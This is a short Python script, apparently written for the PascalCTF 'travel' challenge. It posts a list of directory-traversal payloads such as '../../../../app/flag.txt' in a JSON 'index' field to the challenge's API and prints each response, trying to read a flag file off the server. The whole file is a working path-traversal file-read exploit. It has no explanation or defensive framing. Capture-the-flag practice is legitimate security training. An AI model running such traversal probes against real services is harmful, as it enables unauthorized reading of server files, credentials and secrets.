import requests

url = "https://travel.ctf.pascalctf.it/api/get_json"
headers = {"Content-Type": "application/json"}

payloads = [
    "../../../../../../app/flag.txt",
    "../flag.txt",
    "/app/flag.txt",
    "../../../../app/flag",
    "../../../flag",
    "flag.txt",
    "flag"
]

for payload in payloads:
    data = {"index": payload}
    print(f"\n[*] Trying: {payload}")
    try:
        r = requests.post(url, json=data, headers=headers)
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")